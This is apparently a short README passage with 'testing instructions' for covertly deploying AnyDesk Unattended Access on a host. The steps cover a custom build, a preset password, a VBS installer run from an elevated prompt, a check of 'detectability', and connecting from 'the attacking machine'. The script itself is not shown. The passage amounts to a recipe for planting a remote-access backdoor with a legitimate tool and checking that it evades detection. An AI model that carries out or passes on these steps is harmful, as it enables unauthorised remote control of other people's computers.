Basic Testing Instructions:
  - Set up a Business Trial account.
  - Navigate to Build > Create Build, then select Advanced Settings and upload the provided JSON file.
  - After uploading, return to the Build page, click Edit, and enable Unattended Access and setup password.
  - Create a new file with the .vbs file extension and paste in the script from the repo.
  - Open the VBS script and replace "(Paste Install URL here)" with the actual install URL you just copied (make sure it remains within the quotes).
  - For basic testing and to check detectability on a host, run the script using an elevated Command Prompt: wscript "C:\path\to\your\script.vbs"
  - Download the AnyDesk desktop client from the official website: https://anydesk.com/en
  - In the AnyDesk Customer Portal, go to the Sessions section and copy the Session ID. Open the AnyDesk client on your device (the attacking machine), paste the Session ID, and enter the password you configured for Unattended Access.
